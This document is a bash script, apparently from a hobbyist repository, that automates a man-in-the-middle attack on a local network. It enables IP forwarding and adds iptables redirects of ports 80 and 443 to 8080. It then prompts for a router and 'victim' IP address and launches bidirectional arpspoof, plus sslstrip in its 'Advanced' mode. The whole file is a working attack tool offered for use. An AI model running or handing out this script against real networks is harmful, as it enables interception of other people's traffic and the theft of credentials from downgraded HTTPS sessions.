#!/bin/bash
#Copyright (C) 2020 Vicky Arts
#This script is for easy MITM attack
#This script requires zenity and xterm
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033"
RedF="${Escape}[31m";
LighGreenF="${Escape}[92m"
clear
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear
#check dependencies existence
echo -e $blue "" 
echo " ® Checking dependencies configuration ®" 
echo "                                       " 

#check if xterm is installed
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
  which xterm > /dev/null 2>&1
  sleep 2
else
  echo ""
  echo -e $red "[ X ] xterm -> ${RedF}not found! "
  sleep 2
  echo -e $yellow "[ ! ] Installing Xterm "
  sleep 2
  echo -e $green ""
  sudo apt-get install xterm -y
  clear
  echo -e $blue "[ ✔ ] Done installing .... "
  which xterm > /dev/null 2>&1
fi
#check if zenity is installed
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ found ]"
  which zenity > /dev/null 2>&1
  sleep 2
else
  echo ""
  echo -e $red "[ X ] Zenity -> ${RedF}not found! "
  sleep 2
  echo -e $yellow "[ ! ] Installing Zenity "
  sleep 2
  echo -e $green ""
  sudo apt-get install zenity -y
  clear
  echo -e $blue "[ ✔ ] Done installing .... "
  which zenity > /dev/null 2>&1
fi
#check if arpspoof is installed
which arpspoof > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo -e $green "[ ✔ ] Arpspoof..........................${LighGreenF}[ found ]"
  which arpspoof > /dev/null 2>&1
  sleep 2
else
  echo ""
  echo -e $red "[ X ] Arpspoof -> ${RedF}not found! "
  sleep 2
  echo -e $yellow "[ ! ] Installing Arpspoof "
  sleep 2
  echo -e $green ""
  sudo apt-get install dsniff -y
  clear
  echo -e $blue "[ ✔ ] Done installing .... "
  which arpspoof > /dev/null 2>&1
fi
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e $red"[*] Stopping script... "
iptables --flush
sleep 1
echo ""
echo -e $yellow"[*] Thanks For Using MITM-script :)"
exit
}

function redirect()
{
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
}

function banner()
{
  clear
  echo ""
  echo -e $red "                                                                    __  __ ___ _____ __  __                   "
  echo -e $red "                                                                   |  \/  |_ _|_   _|  \/  |                  "
  echo -e $red "                                                                   | |\/| || |  | | | |\/| |                  "
  echo -e $red "                                                                   | |  | || |  | | | |  | |                  "
  echo -e $red "                                                                   |_|  |_|___| |_| |_|  |_| Script           "
  echo ""
  echo -e      "                                                                         By Vickyarts                         "
  echo ""
}
function get_routerip()
{
  routerip=$(zenity --title="☢ Set RouterIP ☢" --text "example: 192.168.43.1" --entry-text "" --entry --width 300 2> /dev/null)
}
function get_victimip()
{
  victimip=$(zenity --title="☢ Set VictimIP ☢" --text "example: 192.168.43.147" --entry-text "" --entry --width 300 2> /dev/null)
}
function arpspoofing()
{
  xterm -T "Arpspoof" -fa monaco -fs 10 -bg black -e "arpspoof -t $routerip $victimip" &
  xterm -T "Arpspoof" -fa monaco -fs 10 -bg black -e "arpspoof -t $victimip $routerip" &
  sleep 1d
}
function arpspoofingwithsslstrip()
{
  xterm -T "Arpspoof" -fa monaco -fs 10 -bg black -e "arpspoof -t $routerip $victimip" &
  xterm -T "Arpspoof" -fa monaco -fs 10 -bg black -e "arpspoof -t $victimip $routerip" &
  xterm -T "SSLstrip" -fa monaco -fs 10 -bg black -e "sslstrip -a -p 8080" &
  sleep 1d

}
function whichport()
{
  echo -e $green "                                                           All the traffic are routed through port 8080   "
}
function get_mode()
{
  modeopt=$(zenity --list --title "☢ MITM-Mode ☢" --text "\nChose mode:" --radiolist --column "Choose" --column "Option" TRUE "Simple MITM" FALSE "Advanced MITM (need sslstrip)" --width 400 --height 400 2> /dev/null)
}
function nosslstrip() 
{
  which sslstrip > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
    which sslstrip > /dev/null 2>&1
    sleep 2
  else
    zenity --warning --text="sslstrip not found" --width 160 2> /dev/null
    sleep 2
    clear
    sleep 1
    exit
  fi
}
clear
redirect
clear
sleep 2
banner
sleep 3
whichport
get_mode
if [[ $modeopt = *'Advanced MITM (need sslstrip)'* ]]; 
  then
  nosslstrip
  get_routerip
  get_victimip
  arpspoofingwithsslstrip
else
  get_routerip
  get_victimip
  arpspoofing 
fi



  
  